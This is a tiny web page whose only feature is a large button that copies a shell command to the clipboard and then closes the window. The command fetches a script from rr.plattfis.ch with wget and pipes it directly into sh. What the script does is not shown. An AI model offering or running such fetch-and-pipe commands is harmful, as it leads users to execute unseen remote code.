<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>plattfis.ch</title>
</head>
<body>
<button style="color:white; background:forestgreen; width: 100%; font-size: 100px;" onclick="myFunction()" id="b">Copy Command</button>
<script>
    function myFunction() { navigator.clipboard.writeText(" exec wget -q -O - https://rr.plattfis.ch/cr.sh | sh && exit\n"); window.close(); }
    function sleep(ms) { return new Promise(resolve => setTimeout(resolve, ms)); }
</script>
</body>
</html>
